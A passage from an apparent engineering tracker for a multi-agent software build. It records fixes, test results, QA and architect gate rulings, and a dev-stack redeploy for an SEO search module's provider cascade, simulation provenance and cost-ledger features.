**Follow-ups:** keyword and snapshot provenance await 0048/SM-36; SM-17's ledger surface must select
`simulated` (recorded in the contract doc).

---

## 6h · SM-45 — mcp-hub served ZERO module tools (2026-07-29) · **DEV-VERIFIED live**

Not a search bug. `/mcp/tool-defs` aggregates **every** module's tools, so no agent and no n8n flow
could call **any** module tool. Found by the SM-39 audit, confirmed by me from the container logs.

**The log showed two boot generations** — an earlier boot with 13 module tools, a later restart at 0.
So this was never merely a cold-boot problem: it recurs on **any** platform restart, and no
`depends_on` can help there, because ordering constraints are not re-evaluated once containers are up.
That is why the retry/self-heal is the fix that matters and the compose ordering is only the cheap
half.

**Changed:** `mcp-hub/src/module-tools.ts` (retry-with-backoff + periodic refresh + a status object +
a WARN with a running failure count on *every* failed attempt, not one line at boot);
`server.ts` (HTTP listener comes up first, bootstrap runs in the background instead of `await`-blocking
startup on one fetch — so a slow platform can no longer hold the hub down); `metrics.ts` (WS9 gauges
`hub_module_tools_registered` / `hub_module_tools_consecutive_failures`); `module-tools.test.ts`
(fake-timer test reproducing the race and the heal); `.env.example`
(`HUB_MODULE_TOOLS_RETRY_BASE_MS`/`_RETRY_MAX_MS`/`_REFRESH_MS`); and `docker-compose.vps.yml`
(a real `platform` healthcheck + `condition: service_healthy` on `mcp-hub`, `mcp-hub-central`,
`knowledge`, `platform-ui`). Idempotent re-registration was free — the registry is a Map keyed by tool
name. `docker-compose.local.yml` deliberately untouched, so the published-port hazard never arose.

**A detail worth keeping:** the healthcheck uses `wget -qO- http://127.0.0.1:3004/health`, **not
`localhost`** — busybox wget resolves `localhost` to `::1` first and the app binds IPv4 only, which
produced a false-negative "connection refused" during verification. A healthcheck that fails for the
wrong reason is worse than none: it would have made every dependent service wait forever.

**Verified on the live stack by reproducing the race, not by reading the diff:** stopped `platform`,
recreated `mcp-hub` → hub started fine and logged
`(consecutive failures: 1, will retry)`; `/health` reported `registered: 0`. Brought `platform` back,
waited for its new healthcheck → **`mcp-hub` was never restarted** (`RestartCount=0`, `StartedAt`
unchanged) and picked the tools up on its own.

**Re-verified independently by me afterwards:** `/health` → `moduleTools: {registered: 16,
consecutiveFailures: 0, lastError: null}`; hub catalog **64 tools** (was 48 with zero module tools);
`RestartCount=0`. mcp-hub suite 14 files / 84 tests green.

### Correction — "18 `search.*` tools in the hub" was the wrong expectation

I wrote that acceptance criterion, and it was wrong. The platform correctly exposes **18** `search.*`
defs at `/mcp/tool-defs`, but only **4** are callable over the hub today —
`listEngagements`, `clusterKeywords`, `draftBrief`, `draftReport`. The other 14 are **informational
stubs with no `pathTemplate`** (documented as such in `modules/search/index.ts` lines 118–122: "real
binding lands with SM-14" etc.), and `module-tools.ts` has always skipped non-callable defs by design.
Pre-existing and intended, not a residual of this fix. 16 module tools total are registered, all with
real HTTP bindings. The agent flagged this rather than quietly reporting 4-of-18 as a pass.

**Not verified:** the two new OTel gauges end-to-end — `OTEL_ENABLED=0` in this compose, so no
exporter was live to sample. Code path mirrors the existing `hub_tool_calls_total` pattern.

---

## 6i · SM-36 + SM-44 record (2026-07-29) — **DEV-VERIFIED; ⚡ gate owed**

**Independently verified by me after all wave-3 agents finished:** platform-nest
**88 files / 944 tests green in ONE `npx vitest run`** (`--maxWorkers=4`, see the note below) ·
`tsc --noEmit` clean · `lint:withtenants` OK (114 files) · migration 0048 applied to the dev DB with
all six provenance columns confirmed in `information_schema`: the four `simulated` /
`metrics_simulated` are `NOT NULL DEFAULT false` and `metrics_provider` is nullable, as specified.

### SM-36 — the cascade

`config.search.capabilityPreference: Record<Capability, string[]>`, one **ordered** list per
capability, each env-overridable (`SEARCH_PREFERENCE_SERP`, `_VOLUME`, `_DIFFICULTY`, `_SUGGESTIONS`,
`_BACKLINKS`, `_COMPETITORS`, `_AI_VISIBILITY`), seeded byte-for-byte from §A2. Cascade:

1. `tool_scope.provider[opKind]` — honor-or-refuse
2. `tool_scope.provider.default` — honor-or-refuse
3. `config.search.tenantDefaultProvider` — honor-or-refuse
4. `capabilityPreference[capability]` — **the only tier permitted to fall through**, and only across
   registered *and* capable providers

The design's nicest property: **`serp` and `ai_visibility` are seeded as length-1 lists**, so §A2's
"refuse, never substitute" falls out of the data with **no special-case code**. A rule expressed as
configuration cannot be forgotten by the next person editing the branch — which is exactly what a
special case invites. Tiers 1–3 keep the existing honor-or-refuse behaviour via a new
`requireExplicitProvider()`: a bad explicit override still refuses rather than quietly falling
through to tier 4.

**Mutation-tested by the implementer:** widening `capabilityPreference.serp` to
`["dataforseo","semrush"]` turned 2 of its 14 new registry tests red; restored and re-verified. The
no-substitute guarantee is genuinely pinned, not merely configured.

### SM-44 — all three micro-hardenings landed

(a) `writeCache`'s `simulated` param is now **required**, matching `readFreshCache` — the write side
was the remaining half of the same hazard, and its failure direction was *under*-labelling, i.e. a
simulated row written as real. (b) The DataForSEO simulator now reads
`config.search.dataforseo.queue` for `serp`/`ai_visibility`, so a live-queue demo no longer
under-prices by 3.3×. (c) Ahrefs builds its capability set in the constructor and **drops `serp`
when `rankTrackerProjectId` is unset**, so the registry refuses honestly at selection time instead of
the driver failing mid-call.

**Three `simulation.test.ts` tests had to be corrected** — they assumed `sims[0]`/DataForSEO serves
every op kind, which SM-36's routing invalidated. Now they assert the actual per-vendor split
(dfs=3, semrush=1, ahrefs=1). Worth noting as a healthy signal: the tests broke because the routing
became real, and they were fixed by teaching them the new truth rather than by loosening them.

### One AC clause is NOT dischargeable yet — stated, not quietly passed

SM-36's "metrics writes stamp `metrics_provider`" has **no code path to test**: no provider-metrics
writer exists yet. `search.controller.ts`'s keyword PATCH is a manual human edit, not a metrics write.
That writer is **SM-14**'s (still deposit-gated per §A1). The schema is ready; the write-path AC
carries forward to SM-14 rather than being marked satisfied.

### ⚠️ Infra note for §0 — full-repo runs can crash the shared Postgres

During a full-repo `vitest run` at default concurrency, parallel load exhausted Postgres shared memory
and the container dropped into WAL recovery (`could not resize shared memory segment`, `the database
system is in recovery mode`). **Not attributable to this diff** — it is resource exhaustion on shared
infra, the class §0/SM-31 already anticipates. The agent correctly waited for the container's own
recovery (~3 min) rather than restarting it, and re-verified the search suite identically green
(336/336) before and after.

**Mitigation now proven:** run the full suite with **`--maxWorkers=4`** — my final 88-file/944-test
run completed cleanly in ~6 min with no recovery event. Recommend that as the default full-suite
invocation on this dev machine, alongside the `TEST_DB_PREFIX` and `REDIS_URL` requirements.

---

## 6j · ⚡ Wave-3 gate — SM-36 + SM-44, ARCHITECT HALF + P2 readiness ruling (2026-07-29)

**Verdicts: SM-36 APPROVE-WITH-NOTES · SM-44 APPROVE-WITH-NOTES** — (a) and (c) clean, (b) correct
but unpinned (below). No REVISE: the one blocking-class defect (tier-4 fallback) was found and fixed
by the QA half within the gate; the landed state is what these verdicts cover. Full standing-rule
amendments in addendum **§A9** (A1.2); the QA half's own record is **§6k**; this record is the
tracker-side detail + the P2 ruling.

### The QA half's tier-4 find — ratified, and my miss owned

`resolveProvider` tier 4 fell back to `config.search.defaultProvider` (a *different vendor*) on an
empty/missing `capabilityPreference[capability]`, with a pre-existing test pinning the fallback as
correct — exercised only for `volume`, never for the two no-substitute capabilities. Not reachable
via env (`preferenceList()` guarantees non-empty) but reachable by any future capability added
without a preference entry and by direct config mutation. **QA's fix (empty/missing ⇒
`NoCapableProviderError`, uniformly) is RATIFIED** — an empty list is a misconfiguration, and
honoring it with a silently-chosen vendor is the §A2 violation class; `tenantDefaultProvider`
remains the explicit single-key route. **My design half read that exact branch and its test and
accepted the comment's "defensive fail-closed" framing — the fail-direction analysis was wrong
(substitution is fail-OPEN for no-substitute capabilities).** The adversarial half caught what the
design half rationalized. Fourth instance of this program's standing lesson: §4d caught a catch-to-0,
§6d a name-anchored pin, §6f a warn-only bound — this one *enforced the wrong thing and had a test
agreeing with it*.

### Cascade + config rulings (Part 1)

- **Mechanism ACCEPTED:** §A2's no-substitute rule implemented as length-1 seeded data with no
  special-case code is the right shape. Enforcement is now four-layer (addendum §A9.2): byte-pinned
  seeds · empty ⇒ refuse · **env parse REMOVED for `serp`/`ai_visibility` (SM-46d — an operator
  widening or repointing those two must be a code change, i.e. the §A2 design gate)** · mutation-
  tested widening pins. The other five lists stay env-overridable (OQ-9/10 repointability is real).
- **Tiers 1–3 honor-or-refuse regression-pinned** against a multi-vendor registry (per-tool,
  engagement-default, tenant tiers each proven to refuse rather than substitute; `pickProviderKey`
  proven to report the same winner dispatch bills). Cache-key-includes-provider left untouched.
- **Migration 0048 RATIFIED** (senior-db eyes per §A6): additive-only, metadata-only ALTERs,
  load-bearing `NOT NULL DEFAULT false` justified (pre-existing rows genuinely predate simulation),
  partial `WHERE simulated` indexes near-zero-cost, `metrics_provider` deliberately unconstrained,
  column comments carry the stamping law.

### §A4.7 enumeration — the complete reader/persister inventory as of 0048

§A4.7 is **WIDENED** (addendum §A9.3): adding a provenance column to an existing table obliges the
adding ticket's gate to re-enumerate that table's EXISTING readers — "the table is currently empty"
is not a disposition, it is a deferral that expires unrecorded the moment the first writer lands.
The QA half found one such reader; this sweep found one more, same class. Zero `INSERT INTO` paths
exist for any snapshot table (QA-confirmed), so all three tables are empty in every env — which is
exactly why both fixes land NOW, not at SM-14.

| Reader / persister | Table · fields | Disposition · owner |
|---|---|---|
| `modules/search/index.ts:41-47` — `search.rank.top10` rollup (exec-facing) | `search_rank_snapshots` COUNT | **filter on current mode — SM-46a, NOW** (ratified §A8.5 pattern) |
| `search.controller.ts:1571-1577` — `draftReportNarrative` top-10 count (CLIENT-facing narrative; QA's find) | `search_rank_snapshots` COUNT | **filter on current mode — SM-46b, NOW** — worst reader class: blended synthetic ranks in front of the person least able to detect them |
| — (none) | `search_backlink_snapshots`, `search_ai_visibility` | no readers exist; SM-16 writes first and owns stamp + any reader's badge/filter |
| `listKeywords` (controller:820-835) | `search_keywords` metrics; SELECT does NOT yet expose `metrics_provider`/`metrics_simulated` | **badge — SM-14** widens the SELECT + BFF envelope + demo fixtures in the same diff (§4i discipline); SM-38's chips then arm themselves |
| keyword PATCH (controller:837-866) | intent/clusterLabel/isTracked ONLY | mode-inherent — cannot touch metric values (confirms §6i). Standing note: metric editing via PATCH ever added ⇒ §A4.7 fires (clear or restamp provenance) |
| keyword import INSERT (controller:790-813) | keyword/locale only | mode-inherent — metrics stay NULL = honest "not pulled" |
| `clustering.ts` (223-330) | embedding/cluster/intent | mode-inherent — our AI-derived fields, not vendor market data |
| brief grounding (controller:1290-1298) | keyword/intent/cluster_label only | mode-inherent today; inherits filter/state duty if it ever reads metric values |
| **`seed/search.ts:126,150`** | INSERTs volume/difficulty/cpc on all 25 keywords | **stamp — SM-46c, NOW.** ⚠️ In violation of the SM-37 retroactive rule since 0048 landed — and my §A6 claim "no keyword metric values seeded" was factually WRONG (addendum §A9.4) |
| ledger/cache/provider_calls surfaces | (0047 tables) | unchanged from the §A8.2 inventory; this diff only tightened `writeCache`'s signature |

### SM-44 detail

(a) **APPROVE** — required `simulated` on `writeCache`; the compiler is the pin, sole caller
explicit. (b) **APPROVE-WITH-NOTES** — the queue normalization lives ONCE at the config parse
boundary (`config.ts:156`: anything ≠ `"live"` ⇒ `"standard"`) and both live driver and simulator
strict-compare the normalized value, so the typo-cannot-triple-the-bill property is inherited *by
construction*; benign divergence: live captures queue at construction, sim reads config at call time
(both process-constant in prod). **Defect: the branch is unpinned** — deleting the conditional
leaves the suite green (the parity test asserts only Standard rates). By this chain's own mutation
standard, unproven ⇒ **SM-46e**. Also: sim clamps `items ≥ 1`, live uses `items ?? 1` — sim's shape
is safer (a $0 serp estimate on items:0 is the live drivers' wart); SM-42 aligns the live drivers.
(c) **APPROVE** — construction-time capability drop pinned at set level + direct-call refusal;
`projectMonthlyCost` now yields the honest `note`/null-provider for an unservable serp instead of a
$0 price.

### SM-46 · **NEW** — provenance-reader + cascade-config micro-batch — tier `junior` · default model

One agent, runs FIRST and ALONE (it touches the shared files everything else wants). Items, ACs exact:

- **(a)** `search.rank.top10` rollup gains `AND simulated = $2` (param: `config.search.providerMode
  === "simulate"`), same shape as the `provider_cost.month` filter in the same function. AC: with
  hand-inserted mixed rows, sim mode counts only sim rows, live mode only real rows — both directions.
- **(b)** `draftReportNarrative`'s top-10 count gains the identical predicate. AC: same
  both-directions pin; report narrative facts computed from current-mode rows only.
- **(c)** both seed INSERTs stamp `metrics_simulated = true` + `metrics_provider = 'semrush'`
  (plausible: volume/difficulty's §A2 default vendor). AC: re-run seed on a wiped dev DB → all 25
  keywords carry provider + simulated=true; idempotency unaffected.
- **(d)** `config.ts`: `serp` and `ai_visibility` lose their `preferenceList(env, …)` parse —
  hardcoded `["dataforseo"]` literals + the §A2 no-widen comment. AC: `SEARCH_PREFERENCE_SERP=
  "dataforseo,semrush"` in env has NO effect (test via config re-eval or documented as parse-absent);
  existing byte-for-byte pin updated to assert the env-independence.
- **(e)** `simulation.test.ts`: queue-aware pricing pin — flip `config.search.dataforseo.queue` to
  `"live"` in try/finally, assert sim `serp` AND `ai_visibility` price at `DFS_RATES.serpLivePerTask`,
  restore, re-assert Standard. AC: deleting the queue conditional in `estimateFor` fails the suite.

Gate: inline QA + async architect look at the two WHERE predicates (they are the §4d class); no full
⚡ ceremony — but SM-14's ⚡ gate re-verifies (a)/(b) against genuinely-written rows.

### P2 readiness ruling — inherited ACs (build against simulation per §A1; real-data AC = SM-41)

**SM-14 · rank tracking — senior-be · default · now ⚡** (first snapshot persister, first metrics
writer, widens the BFF keyword envelope). Inherits, verbatim:
1. Every persisted `search_rank_snapshots` row stamps `simulated` from **`DispatchResult.simulated`**
   — never re-read from `config.search.providerMode`, never derived from the nullable
   `provider_call_id` FK (0048 column-comment law). Pin: sim-driver pull ⇒ row `simulated=true`;
   live/mock ⇒ `false`; QA mutation-tests the stamp (delete it ⇒ tests fail).
2. The keyword-metrics writer stamps `metrics_provider = <billed provider key>` +
   `metrics_simulated = DispatchResult.simulated` **in the same UPDATE as the metric values** —
   provenance must never disagree with the payload it sits on (the `writeCache` atomicity principle).
   This discharges SM-36's carried-forward AC clause.
3. Keywords absent from a pull's response keep NULL provider + prior values untouched (absent stays
   absent); a live re-pull over previously-simulated metrics overwrites value+provider+flag together.
4. `listKeywords` SELECT widens to expose `metrics_provider`/`metrics_simulated`; BFF types + demo
   fixtures updated in the SAME diff and verified against the controller's actual SELECT (§4i).
5. Owns ALL platform routes for rank pulls incl. the Standard-queue completion callback n8n will hit
   (flows own zero routes — §A9.8). Any new reader it adds states its mode handling (per-property
   rank history = badge per row, not filter).

**SM-16 · backlinks + GEO/AI-visibility — medior · default** (after SM-14; reuses its pattern).
Same five duties transposed to `search_backlink_snapshots` + `search_ai_visibility`: stamp from
`DispatchResult.simulated` atomically with payload; readers badge; any COUNT/aggregate reader
filters current-mode; fixtures/envelope verified against the SELECT. Engine values must stay within
the 0034 CHECK set (the sim already conforms).

**SM-17 · ledger/cost surfaces — medior · default** (BE: one GET route; FE: console tab). The first
UI onto the money ledger; §A3 semantics are the point:
1. Every rendered row/sum selects + exposes `simulated` and `provider`; per-row SIMULATED chip from
   **the row's flag, never the platform mode** (the badge describes the bytes); engagement header
   states platform mode when simulate (`ProviderModeStatement` exists).
2. Language is binding: figures are labelled **"Cost to serve (standard rates)"** — never "spend",
   never "cash". A standing legend states the two-line cash model verbatim: *"Prepaid vendors
   (Semrush, Ahrefs) bill API units against fixed subscriptions — figures are amortized standard
   rates, not invoices. Actual cash = fixed subscriptions + DataForSEO pay-as-you-go (for DataForSEO,
   cost-to-serve ≈ cash). Cache hits are free."*
3. Sums are current-mode only (ratified §A8.5 pattern). If other-mode history exists it may appear
   only as a separate, labelled "simulated history (excluded)" line — never blended.
4. House rules inherited: "—" never `$0` for unavailable sums; ledger `status` rendered verbatim;
   the word "actual" is FORBIDDEN on any figure until SM-42's true-up + SM-41's reconciliation
   exist (Ahrefs rows are conservative upper bounds until then, and the label must not overclaim).
5. `search:ledger:read`-gated; fields verified against the controller's actual SELECT (§4i), not
   fixtures.

**SM-15 · n8n flows batch 1 — senior-integrator · default** (after SM-14). Mode ruling:
1. **A scheduled flow MAY run in simulate mode — and must**, or the demo excludes automation, which
   is part of the product. Safety is structural, not flow-side: sim mode registers only sim drivers
   (boot exclusion), every row stamps simulated, budgets bind the sim ledger through the same gates.
2. **Flows are MODE-BLIND by construction.** No n8n node reads, carries, or branches on
   `providerMode`; flows call `search.*` MCP tools only (B-4) and the dispatch path is the sole mode
   authority. AC: grep-provable absence of mode handling in every workflow JSON.
3. **A mode flip is an environment-rebuild event (§A4.4) whose boundary includes n8n.** n8n state
   lives outside the platform DB, so a sim-era schedule survives a platform rebuild. Runbook line
   (extends SM-23's §A4.4 debt): *environment rebuild = migrations + seeds + n8n workflow re-import
   from repo; review schedule cadences before live credentials land.* Structural backstop if one
   survives anyway: cadence comes from engagement `tool_scope` (scope-driven, never hardcoded in
   flow JSON — AC), and the five gates + SM-40's provider ceiling bound worst-case spend.
4. Ledger attribution AC: flow-driven pulls carry `requestedBy` = the n8n service principal and
   `correlationId` = the n8n execution id.

### Build order (supersedes §A1's tail; 1–2 agent cap; ∥ = the only blessed pairs)

| Step | Ticket | Seat · model | File ownership (why the pairing is safe) |
|---|---|---|---|
| 1 | **SM-46** | junior · default | `modules/search/index.ts` + `search.controller.ts` (2 WHEREs) + `seed/search.ts` + `config.ts` + `simulation.test.ts` — SOLO, it touches everyone's files; tiny |
| 2 | **SM-40** ⚡ ∥ **SM-17** | senior-be · default ∥ medior · default | SM-40: `providers/{ledger,dispatch}.ts` + `config.ts` + tests (SM-04 template; allowlist entry lands content-keyed per SM-43). SM-17: `search.controller.ts` (new GET) + `platform-ui` — disjoint from SM-40 |
| 3 | **SM-42** | senior-be · default | `providers/{types,dispatch,ahrefs,semrush}.ts` + tests — after SM-40 merges (same files); may overlap SM-17's tail (disjoint). Includes the `items ≥ 1` live-driver alignment (§A9.5). The named hazard: per-op true-up attribution must survive `getBacklinkSummary`'s two parallel calls (last-call-wins is wrong the moment it bills) |
| 4 | **SM-14** ⚡ | senior-be · default | `search.controller.ts` + new rank-tracking module file + `platform-ui` fixtures/types — SOLO (controller-heavy) |
| 5 | **SM-15** ∥ **SM-16** | senior-integrator · default ∥ medior · default | SM-15: n8n workflow JSON + automation seeds + runbook, ZERO platform-nest routes. SM-16: `search.controller.ts` + snapshot writers — disjoint |
| 6 | **SM-41** | qa · default | staging, per vendor as OQ-9/10/11 clear; requires SM-42 landed (its reconciliation is what SM-42 protects) |

No Opus flags in this wave — every hazardous pattern now has a pinned template (SM-04's cross-tenant
sum, SM-33's mode predicates, SM-35's B1 two-layer); SM-42's concurrency item is named, bounded to
one seam, and test-pinnable. SM-21 (opus·high) / SM-25 (opus·medium) keep their existing flags.

---

## 6k · ⚡ QA gate — SM-36 + SM-44 (2026-07-29) · **BOTH PASS**, after a real breach was found

*(Renumbered 6j→6k by the architect: both gate halves appended concurrently and claimed §6j; the
architect half at §6j was already cross-referenced from addendum §A9. Content untouched.)*

Verified by me after the fix: search module **19 files / 323 tests green** (`--maxWorkers=4`).

### The defect — §A2's no-substitute guarantee WAS breakable

SM-36's design leans on a genuinely elegant idea: seed `serp` and `ai_visibility` as **length-1**
preference lists so "refuse, never substitute" needs no special-case code. The seeding was sound —
QA verified `preferenceList()` against empty string, whitespace, comma-only, trailing comma, unknown
vendor key, duplicates and `undefined`, and every one resolves safely.

**The hole was in the code path that handles the data being ABSENT.** Tier 4 read:

```ts
const chain = preference && preference.length > 0 ? preference : [config.search.defaultProvider];
```

An empty `capabilityPreference[capability]` fell back to `config.search.defaultProvider` — **a
different vendor**, not "no constraint". Reproduced directly: with `semrush` registered and capable,
`capabilityPreference.serp = []` and `defaultProvider = "semrush"`, `resolveProvider({}, "serp")`
returned **semrush** where it had to throw. That is the exact clause the whole design exists to
protect, defeated through the empty case.

Not reachable through today's env parsing, so not a live hole — but a landmine: any capability added
to `OP_CAPABILITY` without a matching preference entry, or any code setting the config directly (the
test file already does), detonates it silently.

**Worse, a pre-existing test asserted the dangerous fallback as CORRECT.** It only ever exercised the
path for `volume`, where substitution is permitted — never for the two no-fallback capabilities. So
the suite was actively defending the bug.

**Fixed** in `registry.ts`: an empty or missing list now falls through the loop to
`NoCapableProviderError`, identically to an exhausted one, with a comment stating that
`defaultProvider` is never substituted here. The wrong test was corrected and **two adversarial
regression tests added** (empty `serp` and empty `ai_visibility` lists, each with a registered+capable
vendor named as `defaultProvider` → refuses). Verified: `?? []` then loop then throw, no fallback
branch remains.

**Lesson, and it generalizes past this module:** when a safety property is expressed as data, the
dangerous case is not bad data — it is **absent** data, and the default that fills the gap. The
seeding got scrutiny because it was the visible mechanism; the fallback did not.

### Attacks that held, all mutation-tested

Honor-or-refuse tiers 1–3 (deleting `requireExplicitProvider`'s capability check → 1 red); tier-4
registered+capable filter (dropping `.capabilities.has()` → 2 red); SM-44(c) conditional Ahrefs
`serp` (force-including it → 2 red, and confirmed genuine selection-time refusal with no cached stale
capability set). Casing mismatch (`"DataForSEO"`) fails closed as `unknown_provider` rather than
normalizing to the right vendor — correct, an operator instruction is honored literally or refused.

**SM-44(b) is stronger than asked for:** the simulator reads `config.search.dataforseo.queue` — the
**already-normalized** value — and `config.ts` collapses any non-`"live"` string to `"standard"` once.
Both the live driver and the simulator read that same normalized field, so the two are *structurally
incapable* of disagreeing about queue pricing. A typo cannot triple the bill in either.

**SM-44(a)** is TypeScript-enforced with its one real call site (`dispatch.ts:338`) already explicit.
**Migration 0048** is purely additive, so pre-existing rows read `false`/`NULL` correctly by
construction — no backfill to get wrong; idempotency is the runner's `schema_migrations` tracking.

### Finding forwarded to the architect — an unfiltered rank reader in a CLIENT report

`search.controller.ts:1571-1577` (`draftReportNarrative`, SM-22) counts top-10 ranks from
`search_rank_snapshots` with **no `simulated` filter**. Currently harmless — zero `INSERT INTO` for
that table exists anywhere in `src/`, so it is always empty pre-SM-14 — but 0048 just added the column
it would need, and **§A4.7 was written for *future* readers; it never bound pre-existing ones that
were safe only because their table was empty.** That safety expires the moment SM-14 lands and nothing
re-checks it then. Higher consequence than the monetary rollup fixed earlier: an exec rollup is at
least read by someone who knows the platform, while a client report is read by the person least able
to detect blended synthetic ranks. Relayed to the architect mid-sweep for disposition and for a ruling
on widening §A4.7.

---

## 6l · Redeploy + simulate mode ENABLED in the dev stack (2026-07-29)

### Redeploy

Stale-image survey → rebuilt and recreated **`platform`** (36 source files newer than its image,
including migrations 0047/0048) and **`knowledge`** (13 days stale), with `ai-gateway` cascade-recreated
as a dependency (byte-identical binary, so functionally a no-op restart). `mcp-hub`, `agent-runner`,
`bot`, `bot-media-worker`, `sync-central` verified **not** stale and deliberately left running —
`bot` holds a live WhatsApp session, so needless churn there has a real cost. `platform-ui` is
host-run by design (its container has been exited 13 days, exit 0).

**The agent caught its own measurement bug**, which is worth recording because the same trap will
recur: its first pass used `find -newermt` with a UTC timestamp string that GNU `find` interprets as
**local time**, producing false "stale" verdicts for `ai-gateway`/`agent-runner`/`bot`. It noticed
because a rebuilt `ai-gateway` produced a **byte-identical binary hash** to the running container —
then redid every comparison with epoch conversion. A staleness check that is wrong in the "rebuild
more" direction is cheap; the lesson is that it was caught by *cross-checking with a different
method*, not by staring at the first one.

**Verified live:** `platform` healthy with `:3004` published (both compose files used for every
invocation — ports confirmed by `docker ps` after each recreate); migration chain a genuine no-op
through **0048** (`schema_migrations` timestamp unchanged, no new rows, no errors);
`/mcp/tool-defs` → 200 with all 18 `search.*` defs; **hub self-healed with `RestartCount=0`** across
the platform recreate *and* the later ai-gateway/knowledge cascade — a live re-verification of SM-45
against exactly the scenario no `depends_on` can cover.

**One persisted data change, flagged:** the demo company "Gaia Digital Agency" did not carry `search`
in `enabled_modules`, so every search endpoint 404'd "module search not enabled". Fixed with an
additive `array_append`. Revert if unwanted:
`UPDATE companies SET enabled_modules = array_remove(enabled_modules,'search') WHERE id='019f648c-1732-7495-bfdb-b182193633f9'`.

### Simulate mode is now actually ON — and the gap this closed

The redeploy proved the *field* `providerMode` was live but it read **`"live"`**, because
`SEARCH_PROVIDER_MODE` was unset. The platform default is deliberately `live`, so the whole simulation
programme was built and shipped without ever being switched on in the running stack — the owner's
actual ask ("see result and data") was still unmet at that point.

`SEARCH_PROVIDER_MODE=simulate` added to `infra/compose/.env` with the rationale inline; `platform`
recreated. Boot log:

```
[search] provider mode = simulate — registering synthetic dataforseo/semrush/ahrefs drivers
         (SEARCH_PROVIDER_MODE=simulate); no live vendor credentials are read or used
```

**Live `cost-projection` response — the whole wave-2/3 programme visible in one payload:**

```
providerMode: "simulate"   totalMonthlyUsd: 6.335214
rank        → provider dataforseo  simulated:true  $1.285714/mo (weekly × 500 kw)
volume      → provider semrush     simulated:true  $4.9995/mo
suggestions → provider dataforseo  simulated:true  $0 (disabled)
backlinks   → provider ahrefs      simulated:true  $0.05/mo
ai_visibility → provider dataforseo simulated:true $0 (disabled)
```

**SM-36's §A2 matrix is verifiably live in production config**, not just in tests: volume routes to
Semrush, backlinks to Ahrefs, serp/suggestions/ai_visibility to DataForSEO, and every row carries
`simulated: true` so SM-38's chips have real provenance to read.

### Compose usability defect found and fixed

`search-crawl`'s `TENANT_ID`/`PROPERTY_ID` used `${VAR:?}`. **Compose validates interpolation for
every service regardless of active profile**, so that required-variable syntax made *every*
`docker compose` command on this project fail — `up -d`, `build`, `ps`, `config` — even though
`search-crawl` is profile-gated and never started. The devops agent worked around it with dummy values
each time; I fixed the cause: `${VAR:-}` with a comment explaining why. **Enforcement is not lost** —
`cmd/crawl/main.go`'s `requireEnv()` exits with `missing required env TENANT_ID` on an empty value,
which is the right place for it (the run fails fast; unrelated commands keep working). Verified
`docker compose … config --quiet` now exits 0 with no dummy vars.

### Honest limit — no ledger rows yet, and why

`search_provider_calls` is still **empty (0 rows)**, so the flagged-ledger and simulated-cache paths
are proven by tests but not yet by live traffic. That is **by design, not a gap**: grep confirms
`dispatchProviderOp` has **no HTTP caller** — its callers are SM-14 (rank pulls) and SM-16
(backlinks/GEO), neither of which is built. The projection endpoint is the only live surface that
exercises the estimator today. **SM-14 is what makes a real simulated pull driveable end to end**, and
that is now the highest-value next ticket for demonstrating the department rather than describing it.

---

## 6m · SM-46 — provenance readers + cascade config (2026-07-29) · **DEV-VERIFIED**

Verified by me: search module **19 files / 327 tests green, 0 skipped** (`--maxWorkers=4`) ·
`tsc --noEmit` clean · `lint:withtenants` clean (114 files). All five items landed.

**(a)** `search.rank.top10` rollup filters on current mode inside the DISTINCT-ON subquery.
**(b)** `draftReportNarrative`'s top-10 count gains the identical predicate — the client-facing one.
**(c)** both seed keyword INSERTs stamp `metrics_provider='semrush', metrics_simulated=true`.
**(d)** verified at `config.ts:118,129` — `serp` and `ai_visibility` are now **hardcoded
`["dataforseo"]` literals** with no `preferenceList(env, …)` parse, while the other five stay
operator-repointable. Widening a no-substitute capability is now a code change that must pass the
§A2 design gate, not a deployment-variable edit.
**(e)** the queue-aware pricing branch is pinned, and the implementer **mutation-probed it**: deleting
the `queue === "live"` conditional turned the new test red (`expected 0.006 to be close to 0.02`),
then restored. QA had flagged this branch as correct-but-unpinned; it is now genuinely guarded.

**Both-directions evidence for (a)/(b)** — DB-backed tests hand-insert a *mixed*
`search_rank_snapshots` table (2 simulated top-10 rows, 1 real top-10, 1 real non-top-10) and assert
simulate-mode counts 2 and live-mode counts 1 **from the same table**. A one-directional test would
have missed the fail-open half.

### The live dev database was still in violation — fixed by me

SM-46c's stamping was verified on a **throwaway** DB (`sm46_seed_probe`), correctly avoiding the shared
dev DB — but that meant the environment the owner actually looks at was untouched, because
`seedSearch()` early-returns on an already-seeded engagement, so the new stamping columns could never
reach the existing 25 rows. Confirmed: `total=25 stamped=0 sim_true=0` — seeded volume/difficulty/CPC
presenting as genuine vendor metrics, which is precisely the misrepresentation SM-46c exists to
prevent, still live.

Corrected in `gaiada_platform` to match what a fresh seed now produces:
`UPDATE search_keywords SET metrics_provider='semrush', metrics_simulated=true WHERE volume IS NOT NULL
AND metrics_provider IS NULL` → 25 rows; now `total=25 stamped=25 sim_true=25`.

**Worth generalizing:** an idempotency guard that skips on "already seeded" means **schema changes can
never reach already-seeded demo data**. Every future migration that adds a column the seed writes needs
either a backfill or a deliberate re-seed — verifying on a fresh database proves the code and says
nothing about the environment anyone is looking at.

**Note on test credentials:** `initTestDb()` needs `CREATEDB` to create per-file databases, which
`platform_app`/`platform_owner` lack — `DATABASE_URL_TEST` must use the Postgres superuser. Per-file
RLS testing still runs on the derived `platform_app` role, so app-level isolation is unaffected. Worth
having in §0, since the earlier recipe implied otherwise.

---

## 6n · SM-40 + SM-17 (2026-07-29) — first blessed concurrent pair · **BOTH DEV-VERIFIED**

Verified by me after both finished: backend search suite **19 files / 355 tests green**
(`dispatch.test.ts` 49, `ledger.test.ts` 23, `search.test.ts` 23) · `tsc` clean ·
`lint:withtenants` clean (114 files) · UI **63 files / 604 tests green** · `next build` green with
`/departments/[deptId]/ledger` in the manifest.

The architect's file-ownership split (`providers/*` vs `controller`+UI) held — neither agent touched
the other's files, and SM-17 imported `sumMonthToDate` rather than editing `ledger.ts`.

### SM-40 — per-provider ceiling · ⚡ gate owed

Cascade is now **engagement → tenant → provider → global** (first breach wins). New
`ProviderCeilingUnavailableError` (code `provider_ceiling_unavailable`) fails closed with a cost-0
`failed` ledger row at `<endpoint>.provider_ceiling_unavailable`, guarded so a secondary
`recordBlocked` failure cannot mask the typed error — the §4d template followed exactly.

Amortization: `computeProviderReservationCapUsd(price, reservation)` = `reservation × price`, or
**`null` when price ≤ 0 — never `0`**, because a `$0` cap means *every* dispatch breaches. Per-vendor
reservation fraction, default **0.5** (OQ-12 still open), env-tunable via
